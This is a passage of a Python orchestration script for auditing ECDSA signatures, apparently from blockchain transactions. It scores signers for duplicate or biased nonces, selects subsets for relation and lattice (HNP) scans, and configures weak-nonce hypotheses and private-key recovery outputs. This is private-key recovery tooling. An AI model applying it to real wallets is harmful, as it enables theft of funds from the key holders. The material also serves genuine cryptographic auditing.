    report_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def should_skip_broad_relation_recovery(
    *,
    unresolved_targets_report: dict[str, Any] | None,
    hnp_leak_report: dict[str, Any],
    candidate_evidence_available: bool,
    exhaustive_recover: bool,
    skip_when_resolved_enabled: bool,
) -> dict[str, Any]:
    """Decide whether expensive broad relation/fallback scans have useful input."""
    selected_unresolved = (
        int(unresolved_targets_report.get("selected_rows", 0) or 0)
        if unresolved_targets_report is not None else None
    )
    valid_hnp_leaks = int(hnp_leak_report.get("valid_leak_rows", 0) or 0)
    reasons: list[str] = []
    if not skip_when_resolved_enabled:
        reasons.append("skip_guard_disabled")
    if exhaustive_recover:
        reasons.append("exhaustive_recover_enabled")
    if unresolved_targets_report is None:
        reasons.append("unresolved_target_report_unavailable")
    elif selected_unresolved and selected_unresolved >= 2:
        reasons.append("unresolved_targets_available")
    if valid_hnp_leaks > 0:
        reasons.append("explicit_hnp_leaks_available")
    if candidate_evidence_available:
        reasons.append("candidate_evidence_available")

    skip = (
        bool(skip_when_resolved_enabled)
        and not exhaustive_recover
        and unresolved_targets_report is not None
        and int(selected_unresolved or 0) < 2
        and valid_hnp_leaks == 0
        and not candidate_evidence_available
    )
    if skip:
        reasons.append("no_unresolved_targets_no_hnp_leaks_no_candidates")
    return {
        "skip": skip,
        "selected_unresolved_rows": int(selected_unresolved or 0),
        "valid_hnp_leak_rows": valid_hnp_leaks,
        "candidate_evidence_available": bool(candidate_evidence_available),
        "exhaustive_recover": bool(exhaustive_recover),
        "skip_when_resolved_enabled": bool(skip_when_resolved_enabled),
        "reasons": reasons,
    }


def should_skip_stage1_when_resolved(
    *,
    stage0_subset_info: dict[str, Any] | None,
    unresolved_targets_report: dict[str, Any] | None,
    hnp_leak_report: dict[str, Any],
    candidate_evidence_available: bool,
    exhaustive_recover: bool,
    skip_when_resolved_enabled: bool,
) -> dict[str, Any]:
    """Decide whether Stage1 clustered duplicate-r scan is redundant.

    Stage1 is skipped only after Stage0 duplicate-r handling has classified the
    evidence and no unresolved/candidate/leak input remains. This keeps anomaly-
    only and explicit-candidate runs conservative.
    """
    duplicate_groups = int((stage0_subset_info or {}).get("duplicate_r_groups", 0) or 0)
    nontrivial_groups = int((stage0_subset_info or {}).get("nontrivial_duplicate_r_groups", 0) or 0)
    recoverable_focus_rows = int((stage0_subset_info or {}).get("selected_signatures_recoverable_focus", 0) or 0)
    selected_unresolved = (
        int(unresolved_targets_report.get("selected_rows", 0) or 0)
        if unresolved_targets_report is not None else None
    )
    valid_hnp_leaks = int(hnp_leak_report.get("valid_leak_rows", 0) or 0)
    reasons: list[str] = []
    if not skip_when_resolved_enabled:
        reasons.append("skip_guard_disabled")
    if exhaustive_recover:
        reasons.append("exhaustive_recover_enabled")
    if duplicate_groups <= 0:
        reasons.append("no_duplicate_r_stage0_context")
    if nontrivial_groups <= 0 or recoverable_focus_rows <= 0:
        reasons.append("no_stage0_recoverable_focus")
    if unresolved_targets_report is None:
        reasons.append("unresolved_target_report_unavailable")
    elif selected_unresolved and selected_unresolved >= 2:
        reasons.append("unresolved_targets_available")
    if valid_hnp_leaks > 0:
        reasons.append("explicit_hnp_leaks_available")
    if candidate_evidence_available:
        reasons.append("candidate_evidence_available")

    skip = (
        bool(skip_when_resolved_enabled)
        and not exhaustive_recover
        and duplicate_groups > 0
        and nontrivial_groups > 0
        and recoverable_focus_rows > 0
        and unresolved_targets_report is not None
        and int(selected_unresolved or 0) < 2
        and valid_hnp_leaks == 0
        and not candidate_evidence_available
    )
    if skip:
        reasons.append("stage0_explained_all_duplicate_r_targets")
    return {
        "skip": skip,
        "duplicate_r_groups": duplicate_groups,
        "nontrivial_duplicate_r_groups": nontrivial_groups,
        "recoverable_focus_rows": recoverable_focus_rows,
        "selected_unresolved_rows": int(selected_unresolved or 0),
        "valid_hnp_leak_rows": valid_hnp_leaks,
        "candidate_evidence_available": bool(candidate_evidence_available),
        "exhaustive_recover": bool(exhaustive_recover),
        "skip_when_resolved_enabled": bool(skip_when_resolved_enabled),
        "reasons": reasons,
    }


def _signature_order_key(obj: dict[str, Any], fallback_index: int) -> tuple[int, int, str, int]:
    height_raw = (
        obj.get("height")
        if obj.get("height") is not None
        else obj.get("block_height")
        if obj.get("block_height") is not None
        else obj.get("block")
    )
    time_raw = obj.get("time") if obj.get("time") is not None else obj.get("block_time")
    try:
        height = parse_int(height_raw) if height_raw is not None else 0
    except Exception:
        height = 0
    try:
        ts = parse_int(time_raw) if time_raw is not None else 0
    except Exception:
        ts = 0
    txid = str(obj.get("txid") or "")
    try:
        vin = parse_int(obj.get("vin") if obj.get("vin") is not None else obj.get("input_index") or 0)
    except Exception:
        vin = 0
    return (height or fallback_index, ts, txid, vin)


def build_signer_relation_neighborhood_subset(
    *,
    sig_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    audit_report: dict[str, Any] | None = None,
    out_path: Path,
    report_path: Path,
    min_sigs: int,
    max_signers: int,
    max_rows_per_signer: int,
    max_pairs_per_signer: int,
    neighbor_window: int,
) -> dict[str, Any]:
    """Build a bounded signer-local subset for delta/affine nonce-relation scans.

    This is metadata-only except for the selected signature rows. It avoids
    private/WIF/k disclosure and keeps relation scans focused on same-signer
    temporal neighborhoods.
    """
    facts = load_recovery_graph_facts(recovered_json_path, recovered_k_path)
    recovered_pubs: set[str] = facts["recovered_pubs"]
    recovered_r: set[str] = facts["recovered_r"]
    audit_flagged_pubs: set[str] = set()
    audit_pub_scores: dict[str, int] = {}
    audit_sources: dict[str, list[str]] = defaultdict(list)
    if audit_report:
        signer_sections = (
            ("signer_change_points", "change_points"),
            ("signer_mixture_modes", "mixture_modes"),
            ("signer_longitudinal_drift", "longitudinal_drift"),
        )
        for section, label in signer_sections:
            for item in ((audit_report.get(section, {}) or {}).get("top_flagged_signers", []) or []):
                pub = normalize_pubkey_hex(str(item.get("pubkey") or item.get("pub") or ""))
                if not pub:
                    continue
                audit_flagged_pubs.add(pub)
                audit_sources[pub].append(label)
                audit_pub_scores[pub] = audit_pub_scores.get(pub, 0) + 20
                audit_pub_scores[pub] += min(20, int(item.get("drift_flags", 0) or 0))
                audit_pub_scores[pub] += min(15, int(item.get("change_points_total", 0) or 0) // 10)
                audit_pub_scores[pub] += min(15, int(float(item.get("mixture_mode_score", 0.0) or 0.0) * 3))
        for c in ((audit_report.get("clusters", {}) or {}).get("top_clusters", []) or []):
            key = str(c.get("cluster") or "")
            if not key.startswith("pub:"):
                continue
            pub = normalize_pubkey_hex(key[4:])
            if not pub:
                continue
            risk_score = int(((c.get("risk", {}) or {}).get("score", 0)) or 0)
            if risk_score <= 0:
                continue
            audit_flagged_pubs.add(pub)
            audit_sources[pub].append("cluster_risk")
            audit_pub_scores[pub] = audit_pub_scores.get(pub, 0) + min(50, risk_score)

    groups: dict[str, list[tuple[int, str, dict[str, Any]]]] = defaultdict(list)
    total_rows = 0
    bad_json_rows = 0
    missing_pubkey_rows = 0
    if sig_path.exists():
        with sig_path.open("r", encoding="utf-8", errors="replace") as f:
            for idx, line in enumerate(f, start=1):
                raw = line.strip()
                if not raw:
                    continue
                total_rows += 1
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_json_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_json_rows += 1
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                if not pub:
                    missing_pubkey_rows += 1
                    continue
                groups[pub].append((idx, raw, obj))

    signer_stats = []
    for pub, rows in groups.items():
        if len(rows) < max(2, int(min_sigs)):
            continue
        r_counts: Counter[str] = Counter()
        r_to_sz: dict[str, set[tuple[str, str]]] = defaultdict(set)
        recovered_r_hits = 0
        bad_r = 0
        for _, _, obj in rows:
            try:
                r_hex = format(parse_int(obj.get("r")), "064x")
                r_counts[r_hex] += 1
                s_hex = format(parse_int(obj.get("s")), "064x")
                z_hex = format(parse_int(obj.get("z") or obj.get("m")), "064x")
                r_to_sz[r_hex].add((s_hex, z_hex))
                if r_hex in recovered_r:
                    recovered_r_hits += 1
            except Exception:
                bad_r += 1
        dup_r_events = sum(c - 1 for c in r_counts.values() if c > 1)
        same_r_diff_sz = sum(1 for vals in r_to_sz.values() if len(vals) > 1)
        signer_stats.append(
            {
                "pub": pub,
                "rows": rows,
                "count": len(rows),
                "audit_flagged": pub in audit_flagged_pubs,
                "audit_score": int(audit_pub_scores.get(pub, 0)),
                "audit_sources": sorted(set(audit_sources.get(pub, []))),
                "dup_r_events": dup_r_events,
                "dup_r_values": sum(1 for c in r_counts.values() if c > 1),
                "same_r_diff_signature_values": same_r_diff_sz,
                "recovered_pubkey": pub in recovered_pubs,
                "recovered_r_hits": recovered_r_hits,
                "bad_r_rows": bad_r,
            }
        )

    signer_stats.sort(
        key=lambda x: (
            bool(x["audit_flagged"]),
            int(x["audit_score"]),
            bool(x["recovered_pubkey"]),
            int(x["recovered_r_hits"]),
            int(x["dup_r_events"]),
            int(x["count"]),
        ),
        reverse=True,
    )
    eligible_signer_count = len(signer_stats)
    if max_signers > 0:
        signer_stats = signer_stats[:max_signers]

    selected_raw: dict[tuple[str, str, int], str] = {}
    top_report = []
    rows_per_signer = max(2, int(max_rows_per_signer))
    pair_budget = max(1, int(max_pairs_per_signer))
    # Relation stages are quadratic per signer. Enforce a row cap derived from
    # n*(n-1)/2 <= pair_budget so a single active pubkey cannot dominate a run.
    pair_budget_rows = max(2, int((1 + math.isqrt(1 + 8 * pair_budget)) // 2))
    effective_rows_per_signer = min(rows_per_signer, pair_budget_rows)
    window = max(1, int(neighbor_window))
    estimated_pairs_total = 0
    for stat in signer_stats:
        pub = stat["pub"]
        ordered = sorted(
            stat["rows"],
            key=lambda item: _signature_order_key(item[2], item[0]),
        )
        if len(ordered) > effective_rows_per_signer:
            # Preserve the newest rows and a deterministic prefix sample. This
            # keeps old anomalies reachable while bounding per-signer cost.
            source_len = len(ordered)
            head_n = max(0, min(len(ordered), effective_rows_per_signer // 4))
            tail_n = effective_rows_per_signer - head_n
            ordered = ordered[:head_n] + ordered[-tail_n:]
            rows_dropped_by_cap = max(0, source_len - len(ordered))
        else:
            rows_dropped_by_cap = 0

        signer_selected = 0
        for pos, (_, raw, obj) in enumerate(ordered):
            try:
                vin = parse_int(obj.get("vin") if obj.get("vin") is not None else obj.get("input_index") or 0)
            except Exception:
                vin = 0
            txid = str(obj.get("txid") or "")
            key = (pub, txid, vin)
            selected_raw[key] = raw
            signer_selected += 1
            # Ensure local temporal neighbors are retained even after the head/tail cap.
            for off in range(1, window + 1):
                for np in (pos - off, pos + off):
                    if 0 <= np < len(ordered):
                        _, nraw, nobj = ordered[np]
                        try:
                            nvin = parse_int(
                                nobj.get("vin") if nobj.get("vin") is not None else nobj.get("input_index") or 0
                            )
                        except Exception:
                            nvin = 0
                        selected_raw[(pub, str(nobj.get("txid") or ""), nvin)] = nraw

        top_report.append(
            {
                "pubkey": pub,
                "pubkey_prefix": pub[:20],
                "source_rows": stat["count"],
                "selected_rows": signer_selected,
                "estimated_pairs": signer_selected * (signer_selected - 1) // 2,
                "rows_dropped_by_cap": rows_dropped_by_cap,
                "pair_cap_applied": bool(rows_dropped_by_cap),
                "audit_flagged": bool(stat["audit_flagged"]),
                "audit_score": int(stat["audit_score"]),
                "audit_sources": stat["audit_sources"],
                "dup_r_values": stat["dup_r_values"],
                "dup_r_events": stat["dup_r_events"],
                "same_r_diff_signature_values": stat["same_r_diff_signature_values"],
                "recovered_pubkey": stat["recovered_pubkey"],
                "recovered_r_hits": stat["recovered_r_hits"],
                "selection_reasons": [
                    reason
                    for reason, enabled in (
                        ("audit_flagged_signer", bool(stat["audit_flagged"])),
                        ("recovered_pubkey_seed", bool(stat["recovered_pubkey"])),
                        ("recovered_nonce_overlap", int(stat["recovered_r_hits"]) > 0),
                        ("duplicate_r_inside_signer", int(stat["dup_r_values"]) > 0),
                    )
                    if enabled
                ],
                "likely_blockers": [
                    reason
                    for reason, enabled in (
                        ("row_cap_truncated_candidate_pairs", bool(rows_dropped_by_cap)),
                        ("no_duplicate_r_inside_selected_rows", int(stat["dup_r_values"]) == 0),
                        ("no_recovered_nonce_overlap", int(stat["recovered_r_hits"]) == 0),
                        ("no_recovered_pubkey_seed", not bool(stat["recovered_pubkey"])),
                    )
                    if enabled
                ],
            }
        )
        estimated_pairs_total += signer_selected * (signer_selected - 1) // 2

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with out_path.open("w", encoding="utf-8") as out:
        for raw in selected_raw.values():
            out.write(raw + "\n")

    payload = {
        "source_sigs": str(sig_path),
        "output": str(out_path),
        "total_rows": total_rows,
        "bad_json_rows": bad_json_rows,
        "missing_pubkey_rows": missing_pubkey_rows,
        "signer_groups_total": len(groups),
        "eligible_signers": eligible_signer_count,
        "selected_signers": len(signer_stats),
        "selected_rows": len(selected_raw),
        "estimated_pairs_total": estimated_pairs_total,
        "policy": {
            "min_sigs": int(min_sigs),
            "max_signers": int(max_signers),
            "max_rows_per_signer": int(max_rows_per_signer),
            "max_pairs_per_signer": int(max_pairs_per_signer),
            "effective_rows_per_signer": int(effective_rows_per_signer),
            "neighbor_window": int(neighbor_window),
            "ranking": "audit_flagged+audit_score+recovered_pubkey+recovered_r+dup_r+count",
        },
        "audit_flagged_pubkeys": len(audit_flagged_pubs),
        "audit_flagged_selected": sum(1 for s in signer_stats if bool(s.get("audit_flagged"))),
        "top_signers": top_report[:100],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def cluster_key(obj: dict[str, Any]) -> str:
    pub = (obj.get("pubkey_hex") or obj.get("pub") or "").strip().lower()
    if pub:
        return f"pub:{pub}"
    prev_spk = (obj.get("prev_spk") or "").strip().lower()
    if prev_spk:
        return f"spk:{prev_spk}"
    wscript = (obj.get("witness_script") or "").strip().lower()
    if wscript:
        return f"wsh:{wscript[:40]}"
    return "unknown"


def chi_square_uniform(counts: list[int], expected: float) -> float:
    if expected <= 0:
        return 0.0
    return sum(((c - expected) ** 2) / expected for c in counts)


def compute_cluster_stats(records: list[dict[str, Any]]) -> dict[str, Any]:
    r_vals = []
    for rec in records:
        try:
            r_vals.append(parse_int(rec["r"]))
        except Exception:
            continue

    n = len(r_vals)
    if n == 0:
        return {
            "count": 0,
            "dup_r_values": 0,
            "dup_r_events": 0,
            "tiny_r_lt_2^240": 0,
            "tiny_r_ratio": 0.0,
            "mod16_chi2": 0.0,
            "cluster_risk_score": 0,
        }

    r_counts = Counter(r_vals)
    dup_r_values = sum(1 for c in r_counts.values() if c > 1)
    dup_r_events = sum(c - 1 for c in r_counts.values() if c > 1)

    tiny_r = sum(1 for r in r_vals if r < 2**240)
    tiny_ratio = tiny_r / n

    mod16 = [0] * 16
    for r in r_vals:
        mod16[r % 16] += 1
    mod16_chi2 = chi_square_uniform(mod16, n / 16)

    score = 0
    reasons = []
    if dup_r_values > 0:
        score += 100 + min(100, dup_r_events * 5)
        reasons.append("duplicate_r")
    if tiny_ratio > 0.01:
        score += 20
        reasons.append("tiny_r_ratio")
    if mod16_chi2 > 35.0:
        score += 15
        reasons.append("mod16_bias")

    return {
        "count": n,
        "dup_r_values": dup_r_values,
        "dup_r_events": dup_r_events,
        "tiny_r_lt_2^240": tiny_r,
        "tiny_r_ratio": tiny_ratio,
        "mod16_chi2": mod16_chi2,
        "cluster_risk_score": score,
        "reasons": reasons,
    }


def verification_quality(report: dict[str, Any]) -> dict[str, Any]:
    vg = report.get("verification_gate", {}) or {}
    enabled = bool(vg.get("enabled", False))
    coincurve_available = bool(vg.get("coincurve_available", False))
    verifiable = int(vg.get("verifiable", 0) or 0)
    invalid = int(vg.get("invalid", 0) or 0)
    valid = int(vg.get("valid", 0) or 0)
    dropped = int(vg.get("dropped", 0) or 0)
    invalid_ratio = (invalid / verifiable) if verifiable > 0 else 0.0
    return {
        "enabled": enabled,
        "coincurve_available": coincurve_available,
        "verifiable": verifiable,
        "valid": valid,
        "invalid": invalid,
        "dropped": dropped,
        "invalid_ratio": invalid_ratio,
        "reason_counts": vg.get("reason_counts", {}) or {},
    }


def build_cluster_subset(
    sig_path: Path,
    min_sigs: int,
    cluster_risk_threshold: int,
    max_clusters: int,
    out_path: Path,
    report_path: Path,
    audit_report: dict[str, Any] | None = None,
) -> dict[str, Any]:
    grouped: dict[str, list[tuple[str, dict[str, Any]]]] = defaultdict(list)

    with sig_path.open("r", encoding="utf-8") as f:
        for line_no, line in enumerate(f, start=1):
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
            except json.JSONDecodeError:
                continue
            if not isinstance(obj, dict):
                continue
            grouped[cluster_key(obj)].append((raw, obj))

    cluster_fdr_map: dict[str, int] = {}
    if audit_report:
        for c in ((audit_report.get("clusters", {}) or {}).get("top_clusters", []) or []):
            key = c.get("cluster")
            if isinstance(key, str):
                cluster_fdr_map[key] = int(c.get("fdr_bits_r", 0) or 0)
    global_drift_flags = int(((audit_report or {}).get("height_time_drift", {}) or {}).get("drift_flags", 0) or 0)
    signer_drift_flagged = int(
        ((audit_report or {}).get("signer_longitudinal_drift", {}) or {}).get("signer_count_flagged", 0) or 0
    )

    cluster_rows = []
    for key, rows in grouped.items():
        if len(rows) < min_sigs:
            continue
        stats = compute_cluster_stats([obj for _, obj in rows])
        # Cluster scoring v2: combine local signal with audit context (FDR/drift).
        fdr_bits = int(cluster_fdr_map.get(key, 0))
        drift_weight = 0
        if global_drift_flags > 0:
            drift_weight += 8
        if signer_drift_flagged > 0:
            drift_weight += 6
        context_score = min(40, fdr_bits * 6) + drift_weight
        stats["fdr_bits_r"] = fdr_bits
        stats["context_drift_weight"] = drift_weight
        stats["cluster_risk_score_v2"] = int(stats["cluster_risk_score"]) + context_score
        cluster_rows.append({"cluster": key, **stats})

    cluster_rows.sort(key=lambda x: (x["cluster_risk_score_v2"], x["dup_r_events"], x["count"]), reverse=True)

    flagged = [
        r
        for r in cluster_rows
        if r["cluster_risk_score_v2"] >= cluster_risk_threshold or r["dup_r_values"] > 0
    ]
    flagged = flagged[:max_clusters]
    flagged_keys = {r["cluster"] for r in flagged}

    selected_lines = 0
    with out_path.open("w", encoding="utf-8") as out:
        for key, rows in grouped.items():
            if key not in flagged_keys:
                continue
            for raw, _ in rows:
                out.write(raw + "\n")
                selected_lines += 1

    report = {
        "input_file": str(sig_path),
        "total_clusters": len(grouped),
        "analyzed_clusters": len(cluster_rows),
        "flagged_clusters": len(flagged),
        "selected_signatures": selected_lines,
        "policy": {
            "min_sigs": min_sigs,
            "cluster_risk_threshold": cluster_risk_threshold,
            "max_clusters": max_clusters,
            "scoring": "v2(base+fdr+drift)",
        },
        "top_clusters": flagged,
    }

    with report_path.open("w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)

    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="Automate audit + recovery orchestration")
    ap.add_argument("--sigs", default="signatures.jsonl", help="Input signatures JSONL")
    ap.add_argument("--audit-report", default="ecdsa_audit_report.json", help="Audit report output")
    ap.add_argument("--decision-out", default="automate_decision.json", help="Automation decision summary JSON output")
    ap.add_argument("--baseline-report", default="ecdsa_audit_report_prev.json",
                    help="Previous audit report JSON path used for automatic delta comparison")
    ap.add_argument("--audit-verify-signatures", action="store_true", default=True,
                    help="Enable signature verification gate during audit (default: enabled)")
    ap.add_argument("--no-audit-verify-signatures", action="store_false", dest="audit_verify_signatures",
                    help="Disable signature verification gate during audit")
    ap.add_argument("--audit-cluster-min-size", type=int, default=25,
                    help="Minimum cluster size for audit per-cluster analysis")
    ap.add_argument("--recover-bin", default="./ecdsa_recover_strict", help="Recover binary path")
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--max-iter", type=int, default=2)
    ap.add_argument("--risk-threshold", type=int, default=40,
                    help="Run advanced recover only if global risk.score >= threshold")
    ap.add_argument("--force-recover", action="store_true", help="Run recover regardless of risk score")
    ap.add_argument("--exhaustive-recover", action="store_true",
                    help="Do not stop at selective/cheap paths; run all enabled recovery stages and full-input fallback")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--stage0-only", action="store_true",
                    help="Run only the direct duplicate-r Stage0 recovery when nontrivial duplicate-r exists")
    ap.add_argument("--stop-after-stage0-hit", action="store_true",
                    help="Stop after Stage0 direct duplicate-r recovery if it produced new valid local rows")

    ap.add_argument("--cluster-min-sigs", type=int, default=25,
                    help="Minimum signatures required in a cluster to evaluate risk")
    ap.add_argument("--cluster-risk-threshold", type=int, default=20,
                    help="Cluster score threshold for inclusion in recover subset")
    ap.add_argument("--max-clusters", type=int, default=50,
                    help="Maximum suspicious clusters to include")
    ap.add_argument("--clustered-sigs-out", default="signatures.clustered.jsonl",
                    help="Filtered signature file for recover")
    ap.add_argument("--cluster-report", default="cluster_risk_report.json",
                    help="Cluster risk report JSON")
    ap.add_argument("--recover-json-out", default="recovered_keys.jsonl",
                    help="Recovery output JSONL path")
    ap.add_argument("--recover-txt-out", default="recovered_keys.txt",
                    help="Recovery output TXT path")
    ap.add_argument("--recover-k-out", default="recovered_k.jsonl",
                    help="Recovered k output JSONL path")
    ap.add_argument("--recover-deltas-out", default="delta_insights.jsonl",
                    help="Delta insights JSONL path")
    ap.add_argument("--recover-collisions-out", default="r_collisions.jsonl",
                    help="Collision report JSONL path")
    ap.add_argument("--recover-clusters-out", default="dupR_clusters.jsonl",
                    help="Exported duplicate-R cluster JSONL path")
    ap.add_argument("--hnp-candidates-out", default="hnp_lll_bkz_candidates.txt",
                    help="HNP solver candidate output path")
    ap.add_argument("--hnp-leaks-out", default="signatures.hnp_leaks.jsonl",
                    help="Standardized explicit nonce-leak JSONL passed to the HNP solver")
    ap.add_argument("--hnp-leak-report", default="hnp_leak_report.json",
                    help="Metadata-only report for explicit HNP leak extraction")
    ap.add_argument("--hnp-bounded-k-out", default="hnp_bounded_k_candidates.jsonl",
                    help="Local r->k candidates generated when explicit nonce leakage leaves a bounded search space")
    ap.add_argument("--hnp-bounded-k-report", default="hnp_bounded_k_report.json",
                    help="Metadata-only report for bounded explicit-leak k generation")
    ap.add_argument("--preload-k-candidates", default="",
                    help="Local JSONL file with r plus 64-hex k candidates; passed to ecdsa_recover_strict --preload-k")
    ap.add_argument("--preload-priv-candidates", default="",
                    help="Local WIF/hex/decimal private-key candidate file; passed to ecdsa_recover_strict --preload-priv")
    ap.add_argument("--preload-recovered-json", default="",
                    help="Local recovered_keys.jsonl used to seed/deduplicate recovery graph without printing secrets")
    ap.add_argument("--candidate-validation-report", default="candidate_validation_report.json",
                    help="Local metadata-only report for external candidate validation")
    ap.add_argument("--enable-nonce-hypotheses", action="store_true",
                    help="Generate bounded weak-nonce r->k candidates and validate them locally")
    ap.add_argument("--nonce-hypothesis-models",
                    default=(
                        "timestamp-direct,timestamp-sha256,height-direct,height-sha256,"
                        "txid-sha256,txid-le-sha256,txid-dsha256,txid-le-dsha256,"
                        "txid-low64-direct,txid-low128-direct,txid-vin-sha256,txid-vin-bin-sha256,"
                        "txid-vin-counter-sha256,txid-vin-counter-dsha256,txid-vin-bin-dsha256,"
                        "txid-vin-sighash-sha256,txid-vin-sighash-bin-sha256,"
                        "txid-lcg32-raw,txid-lcg32-sha256,txid-xorshift32-raw,txid-xorshift32-sha256,"
                        "pubkey-txid-vin-sha256,pubkey-txid-vin-bin-sha256,pubkey-txid-vin-dsha256,"
                        "pubkey-txid-vin-counter-sha256,prevout-txid-vin-sha256,prevout-txid-vin-bin-sha256,"
                        "prevout-counter-sha256,prevout-counter-dsha256,z-direct,z-sha256,z-dsha256,"
                        "z-low64-direct,z-low128-direct,z-counter-sha256,z-vin-counter-sha256,"
                        "z-pubkey-counter-sha256,z-lcg32-raw,z-lcg32-sha256,z-xorshift32-raw,z-xorshift32-sha256,"
                        "timestamp-txid-vin-sha256,timestamp-le32-sha256,"
                        "timestamp-le64-sha256,timestamp-pubkey-counter-sha256,timestamp-counter-lcg32-raw,"
                        "timestamp-counter-lcg32-sha256,timestamp-counter-ansi-rand-raw,timestamp-counter-ansi-rand-sha256,"
                        "timestamp-counter-xorshift32-raw,timestamp-counter-xorshift32-sha256,height-txid-vin-sha256,"
                        "height-le32-sha256,height-le64-sha256,height-pubkey-counter-sha256,"
                        "height-counter-lcg32-raw,height-counter-lcg32-sha256,height-counter-ansi-rand-raw,"
                        "height-counter-ansi-rand-sha256,height-counter-xorshift32-raw,height-counter-xorshift32-sha256,"
                        "height-time-txid-vin-sha256,height-time-counter-sha256,timestamp-height-counter-sha256,"
                        "pubkey-height-time-txid-vin-sha256,"
                        "pubkey-height-time-txid-vin-bin-sha256"
                    ),
                    help="Comma-separated candidate_hypotheses.py models")
    ap.add_argument("--nonce-hypothesis-out", default="nonce_hypothesis_k.jsonl",
                    help="Generated r->k candidate JSONL path")
    ap.add_argument("--nonce-hypothesis-report", default="nonce_hypothesis_report.json",
                    help="Generated nonce hypothesis report JSON path")
    ap.add_argument("--nonce-time-window-sec", type=int, default=0,
                    help="Timestamp hypothesis +/- window in seconds")
    ap.add_argument("--nonce-time-step-sec", type=int, default=1,
                    help="Timestamp hypothesis step in seconds")
    ap.add_argument("--nonce-counter-max", type=int, default=0,
                    help="Counter upper bound for timestamp/height counter hash models")
    ap.add_argument("--nonce-small-k-start", type=int, default=1,
                    help="Small-k model inclusive start")
    ap.add_argument("--nonce-small-k-end", type=int, default=0,
                    help="Small-k model inclusive end; 0 disables small-k unless set")
    ap.add_argument("--nonce-max-candidates", type=int, default=200000,
                    help="Maximum nonce hypothesis candidates to test before stopping")
    ap.add_argument("--combined-preload-k-out", default="combined_preload_k.jsonl",
                    help="Merged preload-k path when external and generated k candidates both exist")
    ap.add_argument("--target-pubkey", default="",
                    help="Optional compressed/uncompressed SEC pubkey hex; audit/recover only signatures for this pubkey")
    ap.add_argument("--target-sigs-out", default="signatures.target.jsonl",
                    help="Output JSONL path for --target-pubkey filtered signatures")
    ap.add_argument("--enable-sqlite-index", action="store_true",
                    help="Build/use a local SQLite signature index for target and duplicate-r subset extraction")
    ap.add_argument("--sqlite-index-db", default="signatures.index.sqlite",
                    help="SQLite index path used when --enable-sqlite-index is set")
    ap.add_argument("--sqlite-index-build-report", default="signature_index_build_report.json",
                    help="Metadata report for SQLite index ingestion")
    ap.add_argument("--sqlite-index-report", default="signature_index_report.json",
                    help="Metadata report for SQLite index summary")
    ap.add_argument("--sqlite-index-store-raw", action="store_true",
                    help="Store raw JSON rows in SQLite for faster extraction at higher disk cost")
    ap.add_argument("--stage0-subset-out", default="signatures.dup_r_focus.jsonl",
                    help="Path for the duplicate-r focus subset")
    ap.add_argument("--stage0-recoverable-out", default="signatures.dup_r_recoverable.jsonl",
                    help="Path for nontrivial/cross-pub duplicate-r rows used by direct Stage0 recovery")
    ap.add_argument("--stage0-replay-out", default="signatures.dup_r_replay.jsonl",
                    help="Path for replay-like duplicate-r rows kept for evidence but skipped by Stage0 recovery")
    ap.add_argument("--stage0-classification-report", default="duplicate_r_classification_report.json",
                    help="Metadata-only duplicate-r classification report")
    ap.add_argument("--duplicate-r-pair-report", default="duplicate_r_pair_diagnostics.json",
                    help="Metadata-only per-pair duplicate-r correctness and blocker diagnostics")
    ap.add_argument("--strong-signal-out", default="signatures.strong_signal.jsonl",
                    help="Path for the strongest-signal subset used by random-k stage")
    ap.add_argument("--relation-neighborhood-out", default="signatures.relation_neighborhood.jsonl",
                    help="Path for signer-local rows used by structured delta/affine relation recovery")
    ap.add_argument("--relation-neighborhood-report", default="relation_neighborhood_report.json",
                    help="Metadata-only report for signer-local relation recovery subset")
    ap.add_argument("--relation-min-sigs", type=int, default=8,
                    help="Minimum signatures per signer for relation-neighborhood selection")
    ap.add_argument("--relation-max-signers", type=int, default=200,
                    help="Maximum signers selected for relation-neighborhood scans; 0 means no cap")
    ap.add_argument("--relation-max-rows-per-signer", type=int, default=512,
                    help="Maximum rows retained per signer before neighbor expansion")
    ap.add_argument("--relation-max-pairs-per-signer", type=int, default=8192,
                    help="Hard quadratic pair budget per signer for relation scans")
    ap.add_argument("--relation-neighbor-window", type=int, default=2,
                    help="Adjacent sorted rows retained around selected signer rows")
    ap.add_argument("--enable-chain-extraction", action="store_true", default=True,
                    help="After recovered keys exist, rescan full input with cheap propagation to extract more local k/d chains")
    ap.add_argument("--no-enable-chain-extraction", action="store_false", dest="enable_chain_extraction",
                    help="Disable full-input propagation from already recovered local keys")
    ap.add_argument("--chain-max-iter", type=int, default=2,
                    help="max-iter for the cheap recovered-key chain extraction stage")
    ap.add_argument("--recovery-chain-report", default="recovery_chain_report.json",
                    help="Metadata-only report describing local recovered-key chain coverage")
    ap.add_argument("--known-k-chain-report", default="known_k_chain_report.json",
                    help="Metadata-only report for deriving additional keys from confirmed r->k facts")
    ap.add_argument("--known-k-chain-max-rows", type=int, default=0,
                    help="Max signature rows to scan for known-k propagation (0 = no cap)")
    ap.add_argument("--known-priv-chain-report", default="known_priv_chain_report.json",
                    help="Metadata-only report for deriving additional r->k facts from confirmed private keys")
    ap.add_argument("--known-priv-chain-max-rows", type=int, default=0,
                    help="Max signature rows to scan for known-private-key propagation (0 = no cap)")
    ap.add_argument("--known-k-full-corpus-sigs", default="",
                    help="Optional full signatures JSONL scanned when recovered k facts change; useful when --sigs is a bounded workset")
    ap.add_argument("--known-k-full-corpus-report", default="known_k_full_corpus_report.json",
                    help="Metadata-only report for full-corpus known-k propagation")
    ap.add_argument("--known-k-full-corpus-out", default="signatures.known_k_full_corpus.jsonl",
                    help="Reserved local artifact path for rows reached by full-corpus known-k propagation")
    ap.add_argument("--known-k-full-corpus-max-rows", type=int, default=0,
